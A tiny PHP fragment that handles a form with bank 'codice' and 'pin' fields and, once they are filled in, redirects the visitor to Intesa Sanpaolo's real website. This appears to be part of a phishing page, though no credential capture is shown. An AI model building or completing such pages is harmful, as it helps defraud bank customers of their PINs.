<?php
if(isset($_POST["submit"])){
    if ($_POST["codice"]=="" && $_POST["pin"]==""){
        
    }else{
        header("location:https://www.intesasanpaolo.com/it/persone-e-famiglie.html");
    }
}

?>